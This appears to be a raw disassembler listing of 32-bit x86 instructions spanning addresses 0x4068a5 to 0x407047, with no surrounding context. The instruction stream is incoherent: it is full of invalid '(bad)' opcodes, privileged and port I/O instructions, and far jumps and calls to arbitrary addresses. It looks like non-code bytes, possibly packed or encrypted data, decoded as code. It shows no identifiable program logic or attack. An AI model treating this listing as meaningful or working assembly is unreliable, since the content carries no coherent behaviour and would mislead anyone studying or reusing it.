  4068a5:	fadd   QWORD PTR [edx+0x7f]
  4068a8:	mov    edi,0x5cf0983d
  4068ad:	ficom  DWORD PTR [esi+0x3ad10deb]
  4068b3:	jp     0x40686d
  4068b5:	loope  0x4068e6
  4068b7:	mul    BYTE PTR [esi-0x23]
  4068ba:	push   ebp
  4068bb:	jmp    0x5d7eb2f4
  4068c0:	and    eax,0xd72da3f7
  4068c5:	fiadd  DWORD PTR [esi+0x47eb7c0b]
  4068cb:	cld    
  4068cc:	xchg   edx,eax
  4068cd:	cdq    
  4068ce:	inc    esi
  4068cf:	fxtract 
  4068d1:	pop    edx
  4068d2:	dec    eax
  4068d3:	iret   
  4068d4:	fsubr  st(6),st
  4068d6:	popf   
  4068d7:	pusha  
  4068d8:	mov    bl,0xe5
  4068da:	sbb    BYTE PTR [ebp+0x1e461add],dh
  4068e0:	cld    
  4068e1:	rcl    DWORD PTR [eax-0x57],1
  4068e4:	adc    edi,DWORD PTR [ecx]
  4068e6:	sbb    dl,dh
  4068e8:	and    al,0x47
  4068ea:	out    dx,eax
  4068eb:	sub    DWORD PTR [ebx+0x177a80d4],ebp
  4068f1:	retf   0x2534
  4068f4:	xor    DWORD PTR [ecx+0x5bee9773],edi
  4068fa:	mov    dh,ah
  4068fc:	fist   DWORD PTR [ecx]
  4068fe:	adc    al,0x2f
  406900:	nop
  406901:	sub    al,0x6a
  406903:	inc    ecx
  406904:	jle    0x40692f
  406906:	rcl    BYTE PTR [edx-0x4427340],cl
  40690c:	cmp    DWORD PTR [esi-0x45545208],esi
  406912:	mov    al,ds:0xbbd81c61
  406917:	jg     0x406958
  406919:	push   ss
  40691a:	dec    esp
  40691b:	setg   BYTE PTR [ecx+0x53]
  40691f:	fs push es
  406921:	pminsw mm4,QWORD PTR [edi+0x4301df9b]
  406928:	xchg   edi,eax
  406929:	jb     0x40697d
  40692b:	adc    DWORD PTR [edx+ecx*1-0x3e4ce48f],ebx
  406932:	out    0xbf,eax
  406934:	inc    edi
  406935:	ret    0xd17e
  406938:	adc    ebx,DWORD PTR [ebp+0x254b1a82]
  40693e:	jge    0x4069bd
  406940:	enter  0x4194,0x3a
  406944:	mov    dl,0xf5
  406946:	retf   
  406947:	mov    edi,0x64cff3ba
  40694c:	not    DWORD PTR [eax+0x10]
  40694f:	xchg   dl,ch
  406951:	mov    BYTE PTR [edi],dl
  406953:	or     DWORD PTR ds:0x902c08ad,edx
  406959:	into   
  40695a:	imul   edx,DWORD PTR [edx+ebp*2+0x1aed6f24],0xdf63bc79
  406965:	mov    eax,DWORD PTR [ebx]
  406967:	ret    0x24b3
  40696a:	jnp    0x406939
  40696c:	out    dx,eax
  40696d:	cwde   
  40696e:	push   ecx
  40696f:	mov    ebp,0x60e6756a
  406974:	retf   0x772a
  406977:	and    al,0xe9
  406979:	adc    DWORD PTR [ecx+0x53d3691c],ecx
  40697f:	and    DWORD PTR ds:0xa1fe243,ebp
  406985:	push   eax
  406986:	mov    es,WORD PTR [ebp+esi*4-0x72578db7]
  40698d:	and    BYTE PTR [ebp+0x59],bl
  406990:	mul    BYTE PTR [ecx+0x7b]
  406993:	scas   eax,DWORD PTR es:[edi]
  406994:	fild   DWORD PTR [esi-0x7942290f]
  40699a:	mov    ds:0x28410efa,eax
  40699f:	test   al,0xec
  4069a1:	(bad)  
  4069a2:	scas   al,BYTE PTR es:[edi]
  4069a3:	or     al,ch
  4069a5:	or     al,BYTE PTR ds:0x6e0dcf0d
  4069ab:	add    eax,0xa3faf2b6
  4069b0:	mov    edx,gs
  4069b2:	add    DWORD PTR [ebp-0x6ef54e15],edi
  4069b8:	ud0    esi,DWORD PTR [edx-0x6b32f114]
  4069bf:	jo     0x406962
  4069c1:	inc    ebx
  4069c2:	mov    ebx,0x4924bc22
  4069c7:	inc    esp
  4069c8:	cmp    DWORD PTR [ecx+ebx*4+0x59b7af39],edi
  4069cf:	outs   dx,BYTE PTR ds:[esi]
  4069d0:	cmp    BYTE PTR [edi+0x13],cl
  4069d3:	cmp    BYTE PTR [ebx],ch
  4069d5:	int3   
  4069d6:	or     cl,BYTE PTR [edx+edi*2]
  4069d9:	imul   DWORD PTR [eax]
  4069db:	mov    esi,0xca64ec84
  4069e0:	and    DWORD PTR [ebx+0x39],edx
  4069e3:	push   ebp
  4069e4:	sbb    eax,0x466a032
  4069e9:	aad    0xf5
  4069eb:	repz pop eax
  4069ed:	dec    ebp
  4069ee:	jne    0x406a1b
  4069f0:	and    BYTE PTR [ecx],0x99
  4069f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069f4:	ss xor al,0xa2
  4069f7:	sub    ah,BYTE PTR [ecx+0x56]
  4069fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069fb:	leave  
  4069fc:	arpl   bp,sp
  4069fe:	pop    ss
  4069ff:	add    bx,sp
  406a02:	and    BYTE PTR [ecx],bl
  406a04:	push   eax
  406a05:	mov    ebx,DWORD PTR [edx]
  406a07:	mov    al,0xdf
  406a09:	out    dx,al
  406a0a:	inc    edx
  406a0b:	mov    WORD PTR [ecx],?
  406a0d:	inc    esi
  406a0e:	pop    esp
  406a0f:	xchg   BYTE PTR [esi-0x4c],bl
  406a12:	inc    ecx
  406a13:	mov    ah,0x30
  406a15:	dec    ebx
  406a16:	push   0x3ebfdac1
  406a1b:	or     BYTE PTR ds:0x2223a5e4,al
  406a21:	mov    dl,0x8b
  406a23:	dec    eax
  406a24:	aam    0x81
  406a26:	aas    
  406a27:	mov    ebp,0x78eae130
  406a2c:	xor    DWORD PTR [ebx],edi
  406a2e:	push   edi
  406a2f:	out    dx,al
  406a30:	loopne 0x4069b2
  406a32:	inc    ecx
  406a33:	lds    esi,FWORD PTR [ecx]
  406a35:	jns    0x406a48
  406a37:	jl     0x406a1c
  406a39:	sub    eax,DWORD PTR [eax-0x21]
  406a3c:	push   edi
  406a3d:	enter  0x42c7,0x36
  406a41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a42:	mov    al,0x1
  406a44:	dec    ecx
  406a45:	repnz cmp esp,ebx
  406a48:	sbb    DWORD PTR [edi-0x57],esp
  406a4b:	cmovl  ebx,DWORD PTR [ecx+ecx*8]
  406a4f:	out    dx,al
  406a50:	ficom  WORD PTR [edx]
  406a52:	mov    cl,0x7c
  406a54:	loope  0x406aa8
  406a56:	ret    0x4ba2
  406a59:	cmp    DWORD PTR [edx-0x46f14a12],edx
  406a5f:	push   esp
  406a60:	sbb    BYTE PTR ds:0xe14f6050,0x45
  406a67:	pop    ecx
  406a68:	js     0x406a70
  406a6a:	add    cl,BYTE PTR ds:0x617b6d6b
  406a70:	mov    ecx,0xbe6f86d7
  406a75:	adc    ch,BYTE PTR [ebx]
  406a77:	sub    al,0xd
  406a79:	(bad)  
  406a7a:	sbb    DWORD PTR [edi-0x62],ecx
  406a7d:	lahf   
  406a7e:	push   ss
  406a7f:	daa    
  406a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a81:	adc    ebp,ebp
  406a83:	mov    ebx,DWORD PTR [edx+0x250cb4a8]
  406a89:	pop    ecx
  406a8a:	cmp    DWORD PTR [ecx+eiz*8],esi
  406a8d:	and    BYTE PTR [ecx-0x1c5e8aaf],bl
  406a93:	retf   0xa78d
  406a96:	arpl   si,bx
  406a98:	retf   0x4811
  406a9b:	xor    esp,DWORD PTR fs:[ebx+0x73]
  406a9f:	jmp    0x7bdf:0x382204e2
  406aa6:	daa    
  406aa7:	xor    BYTE PTR [edi-0x42],ah
  406aaa:	mov    ebx,ebp
  406aac:	and    BYTE PTR [eax-0x6],cl
  406aaf:	es sbb ah,ah
  406ab2:	jl     0x406adc
  406ab4:	or     bl,al
  406ab6:	pop    es
  406ab7:	push   cs
  406ab8:	es sahf 
  406aba:	push   ebx
  406abb:	popa   
  406abc:	and    BYTE PTR [eax+0x1c],bl
  406abf:	shr    ch,0x14
  406ac2:	call   0x96d81f54
  406ac7:	adc    edx,DWORD PTR [esp+edx*8+0x1e]
  406acb:	loopne 0x406a60
  406acd:	sbb    esi,DWORD PTR [ebx]
  406acf:	fadd   DWORD PTR [edx-0x13eab08d]
  406ad5:	adc    eax,0xd8de6956
  406ada:	and    DWORD PTR [ecx+0x1f],ebp
  406add:	cmp    DWORD PTR [edi+edx*4-0x15],ecx
  406ae1:	pop    esp
  406ae2:	cwde   
  406ae3:	leave  
  406ae4:	cs push esi
  406ae6:	jbe    0x406ac9
  406ae8:	sub    dl,BYTE PTR [ecx+ecx*2-0x33]
  406aec:	sbb    DWORD PTR [ecx],ebx
  406aee:	call   0xc399a446
  406af3:	and    al,0x6c
  406af5:	(bad)  
  406af6:	neg    ah
  406af8:	mov    al,0x3f
  406afa:	scas   eax,DWORD PTR es:[edi]
  406afb:	(bad)  
  406afc:	sub    al,0x74
  406afe:	xor    DWORD PTR [ecx+edx*4],0x12ff4dc3
  406b05:	and    bh,BYTE PTR [eax+0x68]
  406b08:	cmp    DWORD PTR [edx],edx
  406b0a:	and    BYTE PTR ds:0xff4717d6,bh
  406b10:	rcl    esp,1
  406b12:	sahf   
  406b13:	or     esp,ebp
  406b15:	add    DWORD PTR ds:0x44c6e304,edx
  406b1b:	pusha  
  406b1c:	jne    0x406aac
  406b1e:	(bad)  
  406b1f:	jbe    0x406b05
  406b21:	int3   
  406b22:	adc    al,0xcb
  406b24:	into   
  406b25:	dec    edx
  406b26:	jl     0x406af7
  406b28:	test   BYTE PTR [ecx-0x3b],ah
  406b2b:	test   ecx,esp
  406b2d:	ror    edi,0xc1
  406b30:	(bad)  
  406b31:	mov    esi,0xf2a7f67f
  406b36:	jnp    0x406b0a
  406b38:	cmp    BYTE PTR [edx],cl
  406b3a:	push   edi
  406b3b:	xchg   esp,eax
  406b3c:	xchg   esp,eax
  406b3d:	adc    ecx,DWORD PTR [ecx-0x33]
  406b40:	sti    
  406b41:	mov    esp,0x6f53c287
  406b46:	xchg   esi,eax
  406b47:	out    0xee,eax
  406b49:	push   ebp
  406b4a:	sar    BYTE PTR [esi+esi*8-0x75e78530],0xb5
  406b52:	lock sub BYTE PTR [ebp+0x74],0x41
  406b57:	ror    DWORD PTR [esi+0x7f],0x86
  406b5b:	inc    eax
  406b5c:	adc    BYTE PTR [ecx+0x66],bh
  406b5f:	ss (bad) 
  406b62:	push   ebx
  406b63:	inc    ebx
  406b64:	test   al,0x8e
  406b66:	sbb    ebp,DWORD PTR [ecx+0x7e]
  406b69:	add    al,0xbb
  406b6b:	inc    eax
  406b6c:	ins    BYTE PTR es:[edi],dx
  406b6d:	and    DWORD PTR [ebx+0x5],ebx
  406b70:	xchg   ebp,eax
  406b71:	push   edi
  406b72:	add    eax,0xd5a9c876
  406b77:	out    0xcb,al
  406b79:	loopne 0x406b5b
  406b7b:	ret    
  406b7c:	gs fwait
  406b7e:	or     eax,0x8529ca57
  406b83:	mov    ds:0x23c64b7d,al
  406b88:	in     al,dx
  406b89:	repz repz push si
  406b8d:	loop   0x406b84
  406b8f:	cli    
  406b90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b91:	mov    esp,0x6830451c
  406b96:	fldcw  WORD PTR [esi+0x22]
  406b99:	mov    dh,0x1d
  406b9b:	test   BYTE PTR [ebp-0xa],ah
  406b9e:	xor    eax,0xdc2917ae
  406ba3:	add    dl,BYTE PTR [eax+ebp*8-0x5e]
  406ba7:	or     edi,DWORD PTR [edi]
  406ba9:	stc    
  406baa:	jns    0x406b30
  406bac:	outs   dx,BYTE PTR ds:[esi]
  406bad:	push   ss
  406bae:	fldcw  WORD PTR [ebx+ebx*4]
  406bb1:	sbb    BYTE PTR [edx],dh
  406bb3:	dec    edx
  406bb4:	sub    bl,BYTE PTR [ebp-0x71]
  406bb7:	in     al,dx
  406bb8:	cmp    al,0xd7
  406bba:	mov    esi,0x72c4b284
  406bbf:	sub    al,BYTE PTR [ecx+edx*2]
  406bc2:	inc    edx
  406bc3:	cmp    BYTE PTR [ebp+0x41],0x4e
  406bc7:	cs mov bl,0x44
  406bca:	push   ss
  406bcb:	dec    DWORD PTR [ecx+0x195e27]
  406bd1:	sbb    al,0x4e
  406bd3:	adc    DWORD PTR [esi],0x79
  406bd6:	jge    0x406c15
  406bd8:	add    esp,DWORD PTR [eax]
  406bda:	(bad)  
  406bdb:	dec    ebx
  406bdc:	pop    ebx
  406bdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bde:	aas    
  406bdf:	mov    esp,0x40d1c103
  406be4:	sbb    DWORD PTR [ebx+edx*4+0x26],edx
  406be8:	ds ins BYTE PTR es:[edi],dx
  406bea:	push   es
  406beb:	enter  0x16bb,0xd3
  406bef:	dec    esi
  406bf0:	dec    ebp
  406bf1:	cmp    bl,BYTE PTR [ebx+edi*2+0x6a]
  406bf5:	or     DWORD PTR [edi+0x49],0xffffff8d
  406bf9:	ret    0x644e
  406bfc:	sbb    eax,0xba34b903
  406c01:	cmp    eax,0xd61fdd24
  406c06:	xchg   ebp,eax
  406c07:	push   ds
  406c08:	ret    0x80e1
  406c0b:	push   ss
  406c0c:	adc    BYTE PTR [ecx-0x23],bh
  406c0f:	imul   ecx,eax,0x3f
  406c12:	leave  
  406c13:	rcr    DWORD PTR [ebp+eax*4-0x1175d19f],cl
  406c1a:	mov    dh,0x49
  406c1c:	xchg   DWORD PTR [edi-0x56],ebp
  406c1f:	jne    0x406c01
  406c21:	sub    al,0xdf
  406c23:	retf   0x6177
  406c26:	mov    cl,0x1e
  406c28:	nop
  406c29:	test   BYTE PTR [ebx+0x7d],0x4d
  406c2d:	mov    eax,0x40c52c64
  406c32:	xchg   ecx,ebx
  406c34:	mov    eax,0x7ec46434
  406c39:	ror    DWORD PTR [esi+0x48985c40],cl
  406c3f:	xor    al,0xac
  406c41:	push   0x58b21b8
  406c46:	imul   ecx,DWORD PTR [edx+0x3e],0xec3bcdf7
  406c4d:	fs jge 0x406c34
  406c50:	ins    BYTE PTR es:[edi],dx
  406c51:	add    eax,0xe27692a9
  406c56:	inc    ebp
  406c57:	jno    0x406c06
  406c59:	sti    
  406c5a:	xchg   DWORD PTR [esi-0x62],esp
  406c5d:	adc    ah,BYTE PTR [edx]
  406c5f:	repz js 0x406bf2
  406c62:	fcmovnb st,st(7)
  406c64:	inc    esp
  406c65:	xchg   ecx,eax
  406c66:	pop    ds
  406c67:	sbb    eax,0x2a8cd161
  406c6c:	adc    eax,0x24eb598f
  406c71:	mov    edx,0xd306c66d
  406c76:	mov    bh,0x78
  406c78:	jne    0x406c7d
  406c7a:	es inc eax
  406c7c:	xor    edx,DWORD PTR [edx]
  406c7e:	loop   0x406cda
  406c80:	xlat   BYTE PTR ds:[ebx]
  406c81:	mov    ah,0xe7
  406c83:	(bad)  
  406c84:	pop    ss
  406c85:	xchg   ebx,eax
  406c86:	jecxz  0x406c80
  406c88:	cld    
  406c89:	add    al,0x53
  406c8b:	popa   
  406c8c:	dec    edi
  406c8d:	inc    ebx
  406c8e:	or     DWORD PTR [esi+ecx*1-0x2b],esp
  406c92:	call   0xef4d:0xda76731c
  406c99:	xchg   esi,eax
  406c9a:	stos   DWORD PTR es:[edi],eax
  406c9b:	fld    DWORD PTR [eax+edi*8-0x7f]
  406c9f:	and    DWORD PTR [eax+ecx*2],edi
  406ca2:	sub    DWORD PTR [edi],esi
  406ca4:	jnp    0x406c56
  406ca6:	push   ebx
  406ca7:	fwait
  406ca8:	lods   eax,DWORD PTR ds:[esi]
  406ca9:	jo     0x406c81
  406cab:	std    
  406cac:	dec    eax
  406cad:	sbb    DWORD PTR [eax-0x44bc3f02],edi
  406cb3:	sahf   
  406cb4:	aaa    
  406cb5:	pop    es
  406cb6:	mov    ch,0x1c
  406cb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cb9:	imul   ebp,DWORD PTR [esi+eiz*4],0xcf666dba
  406cc0:	cmp    al,0xa0
  406cc2:	enter  0x4780,0x45
  406cc6:	and    esp,DWORD PTR [edi+0x59]
  406cc9:	xor    dh,BYTE PTR [ebp+0xf]
  406ccc:	loope  0x406c7a
  406cce:	stos   BYTE PTR es:[edi],al
  406ccf:	shr    DWORD PTR [ebx-0x1f],cl
  406cd2:	popa   
  406cd3:	test   BYTE PTR [edi-0x5a182c2c],ch
  406cd9:	ret    
  406cda:	cmp    BYTE PTR [edi+0xaad3d90],ch
  406ce0:	xchg   edi,eax
  406ce1:	mov    ebp,0x147bc49a
  406ce6:	imul   ebx,esp,0xffffff86
  406ce9:	sub    eax,0x10520375
  406cee:	xchg   esi,eax
  406cef:	scas   eax,DWORD PTR es:[edi]
  406cf0:	pushf  
  406cf1:	cmp    DWORD PTR [ebp+0x42bc0977],edi
  406cf7:	mov    ebx,0x7c7df9e4
  406cfc:	adc    al,0x35
  406cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cff:	nop
  406d00:	xor    al,0x8b
  406d02:	xor    BYTE PTR [ecx],0x14
  406d05:	pop    ebx
  406d06:	in     eax,0x67
  406d08:	or     esp,esi
  406d0a:	pushf  
  406d0b:	and    edx,ecx
  406d0d:	int3   
  406d0e:	hlt    
  406d0f:	add    al,0x50
  406d11:	sub    cl,cl
  406d13:	xor    eax,0xcedf0324
  406d18:	or     BYTE PTR [edi-0x7b94c1c5],dh
  406d1e:	dec    edx
  406d1f:	aam    0x2e
  406d21:	push   0x26
  406d23:	les    ecx,FWORD PTR [ebx+0x48]
  406d26:	fidivr WORD PTR [eax+0xd]
  406d29:	jns    0x406d5b
  406d2b:	dec    ebx
  406d2c:	mov    ebp,0xa20d878
  406d31:	mov    ecx,0x1a2bd0e7
  406d36:	inc    ebp
  406d37:	sbb    DWORD PTR [esi],eax
  406d39:	or     bl,BYTE PTR [ecx+0x241fc7a]
  406d3f:	xor    ecx,DWORD PTR [ecx]
  406d41:	jmp    0xd349:0xbb37dae4
  406d48:	cmp    cl,BYTE PTR [edx]
  406d4a:	cmp    bh,BYTE PTR [edx+0x1d920451]
  406d50:	cdq    
  406d51:	stc    
  406d52:	ins    BYTE PTR es:[edi],dx
  406d53:	out    dx,eax
  406d54:	sub    al,0xbf
  406d56:	jb     0x406d0f
  406d58:	fwait
  406d59:	cmp    al,0x19
  406d5b:	xor    dh,dh
  406d5d:	push   esp
  406d5e:	xor    eax,0x6f3ec9f4
  406d63:	pop    es
  406d64:	scas   al,BYTE PTR es:[edi]
  406d65:	sbb    esp,esp
  406d67:	pop    ecx
  406d68:	mov    ecx,0x568ae8c4
  406d6d:	or     BYTE PTR [ebx+0x4b],bl
  406d70:	data16 rcr BYTE PTR [ebx+0x6e],1
  406d74:	ret    0x32a3
  406d77:	(bad)
  406d7a:	jecxz  0x406d4a
  406d7c:	dec    esi
  406d7d:	mov    bl,BYTE PTR [esp+ebp*1]
  406d80:	xchg   al,al
  406d82:	iret   
  406d83:	test   BYTE PTR [ecx+0xbdeaad],ch
  406d89:	dec    edi
  406d8a:	adc    al,0xaa
  406d8c:	adc    bh,BYTE PTR [edx+ebx*2]
  406d8f:	lock icebp 
  406d91:	jecxz  0x406e00
  406d93:	test   esi,eax
  406d95:	xor    ch,dh
  406d97:	lods   al,BYTE PTR ds:[esi]
  406d98:	jae    0x406e0d
  406d9a:	test   ebx,edi
  406d9c:	jno    0x406deb
  406d9e:	cmp    bl,BYTE PTR [ebx+0x67206cdf]
  406da4:	hlt    
  406da5:	lods   al,BYTE PTR ds:[esi]
  406da6:	js     0x406da5
  406da8:	imul   eax,esi,0xe7891001
  406dae:	adc    al,0x28
  406db0:	(bad)  
  406db1:	fistp  WORD PTR [ecx]
  406db3:	fbld   TBYTE PTR [edx+0x4f]
  406db6:	add    bh,BYTE PTR ds:0xc6540f3
  406dbc:	dec    ecx
  406dbd:	adc    ebx,esp
  406dbf:	push   0xd15099
  406dc4:	jmp    0x5b7b:0xb998c87
  406dcb:	sub    eax,DWORD PTR [ebx]
  406dcd:	leave  
  406dce:	mov    esi,edi
  406dd0:	sar    DWORD PTR [ebp+0x7aba56f9],1
  406dd6:	loop   0x406db8
  406dd8:	or     eax,0xc1710b1b
  406ddd:	mov    ch,0x7a
  406ddf:	push   esi
  406de0:	inc    eax
  406de1:	fs cmp eax,0x66b6a351
  406de7:	jecxz  0x406e22
  406de9:	das    
  406dea:	dec    ecx
  406deb:	add    eax,edi
  406ded:	pop    edi
  406dee:	mov    ebp,0x52441b60
  406df3:	or     DWORD PTR [edx+edi*4],0xfa748031
  406dfa:	ja     0x406e31
  406dfc:	das    
  406dfd:	(bad)  
  406dfe:	cld    
  406dff:	imul   ecx,DWORD PTR [ecx-0x3b],0x50cfb42d
  406e06:	push   es
  406e07:	dec    edi
  406e08:	aas    
  406e09:	inc    edi
  406e0a:	popf   
  406e0b:	rol    DWORD PTR [edi-0x2fa12104],0xb
  406e12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e13:	and    eax,0x6f5d4b24
  406e18:	cld    
  406e19:	dec    ecx
  406e1a:	ret    
  406e1b:	std    
  406e1c:	xchg   ebx,eax
  406e1d:	mov    esi,0xec5bb6d2
  406e22:	sbb    dh,BYTE PTR [esi-0x7c]
  406e25:	jns    0x406dbf
  406e27:	push   ebp
  406e28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e29:	push   ecx
  406e2a:	xchg   edi,eax
  406e2b:	cli    
  406e2c:	sbb    DWORD PTR [ebp-0x79],ebp
  406e2f:	pop    ebp
  406e30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e31:	jno    0x406ea0
  406e33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e34:	cmp    ebx,DWORD PTR [esp+esi*1]
  406e37:	pop    ds
  406e38:	inc    ebp
  406e39:	imul   edi,DWORD PTR ds:0x1e14e5da,0x17
  406e40:	xchg   ecx,eax
  406e41:	test   al,0xa6
  406e43:	push   es
  406e44:	adc    ebx,DWORD PTR [edx+0x1d34c4e]
  406e4a:	pop    ebx
  406e4b:	xchg   ebx,eax
  406e4c:	xor    al,0xc7
  406e4e:	pop    eax
  406e4f:	cld    
  406e50:	arpl   WORD PTR [ebx-0x3b],bp
  406e53:	test   BYTE PTR [edi],dh
  406e55:	push   ebp
  406e56:	pop    edx
  406e57:	mov    eax,DWORD PTR [esi+0x1ecde7a2]
  406e5d:	les    esp,FWORD PTR [ecx+0x4c]
  406e60:	mov    edi,0xbd3efe5c
  406e65:	loopne 0x406eb3
  406e67:	stc    
  406e68:	add    edi,DWORD PTR [eax-0x54]
  406e6b:	and    DWORD PTR [edx+0x46],ecx
  406e6e:	inc    esi
  406e6f:	aad    0x2e
  406e71:	clc    
  406e72:	and    eax,0x46385455
  406e77:	add    BYTE PTR [eax],al
  406e79:	test   eax,0x6adce367
  406e7e:	push   0xffffffa9
  406e80:	stc    
  406e81:	ins    DWORD PTR es:[edi],dx
  406e82:	ds cwde 
  406e84:	data16 sbb al,0x91
  406e87:	push   0xffffff9f
  406e89:	(bad)  
  406e8a:	jmp    0x406e94
  406e8c:	push   0x20558b29
  406e91:	and    DWORD PTR [ebx],ebx
  406e93:	mov    edx,0x82f6b4fa
  406e98:	(bad)  
  406e99:	sub    al,0x1b
  406e9b:	adc    esp,esp
  406e9d:	jl     0x406e9f
  406e9f:	arpl   WORD PTR [esi-0x31bc9265],si
  406ea5:	pop    ecx
  406ea6:	jge    0x406ed6
  406ea8:	and    edx,DWORD PTR [ebx-0x2f]
  406eab:	mov    al,0xd
  406ead:	stos   DWORD PTR es:[edi],eax
  406eae:	dec    ecx
  406eaf:	add    edi,ebx
  406eb1:	mov    al,ds:0x612a22b3
  406eb6:	dec    edx
  406eb7:	cli    
  406eb8:	push   ebx
  406eb9:	jmp    0x330f:0x1fa7a209
  406ec0:	push   ss
  406ec1:	retf   
  406ec2:	jno    0x406ed5
  406ec4:	pop    esp
  406ec5:	mov    esi,0x7e5508ff
  406eca:	mov    bh,0x65
  406ecc:	das    
  406ecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ece:	cmp    ebp,DWORD PTR [edi-0x3b]
  406ed1:	push   eax
  406ed3:	cmp    al,0x5d
  406ed5:	not    ebp
  406ed7:	test   BYTE PTR [esp+ebp*1],0x6a
  406edb:	les    ecx,FWORD PTR [edx]
  406edd:	repnz pusha 
  406edf:	js     0x406e68
  406ee1:	adc    bl,BYTE PTR [edi]
  406ee3:	shr    DWORD PTR [edx+0x7e],cl
  406ee6:	mov    gs,ecx
  406ee8:	push   eax
  406ee9:	les    ebx,FWORD PTR [esp+edx*1]
  406eec:	call   0x32d86585
  406ef1:	pop    eax
  406ef2:	mov    edi,0x68c87c6a
  406ef7:	into   
  406ef8:	xor    ebx,0x8456d827
  406efe:	push   eax
  406eff:	xchg   edx,eax
  406f00:	leave  
  406f01:	dec    edi
  406f02:	lods   al,BYTE PTR ds:[esi]
  406f03:	outs   dx,DWORD PTR ds:[esi]
  406f04:	push   es
  406f05:	pop    ebp
  406f06:	mov    esp,0xf288fb4
  406f0b:	inc    ecx
  406f0c:	mov    ecx,0x78a99272
  406f11:	xchg   DWORD PTR [esp+eiz*4+0x347e64ef],ecx
  406f18:	push   es
  406f19:	push   ds
  406f1a:	stos   DWORD PTR es:[edi],eax
  406f1b:	mov    al,0x69
  406f1d:	iret   
  406f1e:	test   sp,sp
  406f21:	xchg   ecx,eax
  406f22:	jle    0x406ec6
  406f24:	jmp    0x406f47
  406f26:	dec    eax
  406f27:	sub    esp,DWORD PTR [ecx-0x4c]
  406f2a:	pop    esp
  406f2b:	adc    BYTE PTR [edi-0x5bf6a46f],bh
  406f31:	pop    ss
  406f32:	push   ebp
  406f33:	sub    bl,BYTE PTR [ebx-0x67]
  406f36:	mov    al,0x9f
  406f38:	push   edi
  406f39:	ret    0x7549
  406f3c:	or     al,0x26
  406f3e:	popf   
  406f3f:	in     eax,0x75
  406f41:	adc    DWORD PTR [edx],ecx
  406f43:	mov    edi,0x129750e5
  406f48:	nop
  406f49:	pusha  
  406f4a:	xchg   ebp,eax
  406f4b:	pusha  
  406f4c:	stos   BYTE PTR es:[edi],al
  406f4d:	jae    0x406f1f
  406f4f:	adc    ax,cx
  406f52:	scas   al,BYTE PTR es:[edi]
  406f53:	cmp    esp,DWORD PTR [ecx+0x27]
  406f56:	xor    al,0x42
  406f58:	dec    esp
  406f59:	sbb    eax,0x11704463
  406f5e:	call   0x86f4161a
  406f63:	push   ebx
  406f64:	ds stos BYTE PTR es:[edi],al
  406f66:	cmp    eax,0xe774df19
  406f6b:	sub    DWORD PTR [eax],edx
  406f6d:	xchg   esi,eax
  406f6e:	in     al,dx
  406f6f:	inc    eax
  406f70:	dec    DWORD PTR [ebp*8-0x1c2c72d1]
  406f77:	sbb    esp,DWORD PTR gs:[ebx+0x2e68ef52]
  406f7e:	es (bad) 
  406f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f81:	inc    ebp
  406f82:	(bad)  
  406f83:	mov    dl,0xce
  406f85:	shl    BYTE PTR es:[ebp-0x610d523],cl
  406f8c:	test   dl,dl
  406f8e:	dec    eax
  406f8f:	lock jmp 0x12c2:0xb0946729
  406f97:	push   edi
  406f98:	arpl   ax,sp
  406f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f9b:	dec    ebp
  406f9c:	dec    esi
  406f9d:	jne    0x406fb8
  406f9f:	pop    esp
  406fa0:	xor    eax,0x54edaeb3
  406fa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fa6:	push   0xffffff8e
  406fa8:	or     bl,dl
  406faa:	test   eax,0xa1442bbf
  406faf:	hlt    
  406fb0:	loopne 0x406ff3
  406fb2:	mov    ds:0xa369c72e,al
  406fb7:	push   ds
  406fb8:	fcomip st,st(2)
  406fba:	cmc    
  406fbb:	(bad)  
  406fbc:	sbb    DWORD PTR cs:[eiz*2-0x14eceeb9],ebp
  406fc4:	pop    ebp
  406fc5:	mov    WORD PTR [ebp-0x28da8f73],gs
  406fcb:	call   0x7759da28
  406fd0:	pop    edi
  406fd1:	xchg   ecx,eax
  406fd2:	sbb    al,0x31
  406fd4:	in     eax,dx
  406fd5:	jle    0x406fa8
  406fd7:	pusha  
  406fd8:	sub    al,0x9e
  406fda:	imul   eax,eax,0x2b156533
  406fe0:	pop    ss
  406fe1:	fiadd  DWORD PTR fs:0xbefa4458
  406fe8:	fs scas al,BYTE PTR es:[edi]
  406fea:	int3   
  406feb:	out    0x9c,al
  406fed:	jecxz  0x407016
  406fef:	out    0xb0,eax
  406ff1:	mov    eax,0xd8f7bb83
  406ff6:	lea    esi,[ebp+0x11]
  406ff9:	imul   esi,DWORD PTR [ecx-0x5],0x386344c1
  407000:	clc    
  407001:	out    0x6,al
  407003:	loop   0x406f92
  407005:	dec    edi
  407006:	fistp  DWORD PTR [ecx-0x11258615]
  40700c:	or     BYTE PTR [esi+0x3526f8d9],0x81
  407013:	loop   0x406fe7
  407015:	add    BYTE PTR [ebx],cl
  407017:	xchg   DWORD PTR [ebx+0x7e],eax
  40701a:	push   0x7daf95fc
  40701f:	sahf   
  407020:	mov    DWORD PTR [edi+0x1f2bd143],esp
  407026:	add    ah,BYTE PTR [esi+0x47ec39e]
  40702c:	inc    ebx
  40702d:	push   ss
  40702e:	xor    eax,0x9883f610
  407033:	mov    ebp,esi
  407035:	addr16 (bad) 
  407037:	dec    ebx
  407038:	sti    
  407039:	cmc    
  40703a:	rcr    BYTE PTR [ecx+0x70],0x2f
  40703e:	and    al,0x67
  407040:	xchg   ecx,eax
  407041:	mov    cl,0x11
  407043:	xor    al,0xd3
  407045:	push   ds
  407046:	inc    eax
  407047:	xor    BYTE PTR [edx+0x33],ah
